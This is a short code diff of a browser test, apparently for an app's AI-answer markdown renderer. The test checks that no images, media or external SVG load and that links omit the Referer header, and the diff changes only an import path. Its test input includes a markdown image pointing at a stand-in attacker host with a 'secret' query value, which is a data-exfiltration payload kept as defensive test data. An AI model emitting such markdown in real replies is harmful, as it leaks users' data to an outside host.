@@ -9,7 +9,7 @@ const EVIL = 'https://evil.example/';
 test('ответ ИИ: ни картинок, ни медиа, ни SVG с внешним адресом; ссылка — без Referer', async ({ page }) => {
   await openApp(page, '/');
   const out = await page.evaluate(async (evil) => {
-    const { renderMarkdown } = await import('/src/features/ai/Markdown.tsx');
+    const { renderMarkdown } = await import('/src/features/ai/renderMarkdown.ts');
     const html = renderMarkdown(
       [
         `![x](${evil}img?d=secret)`,
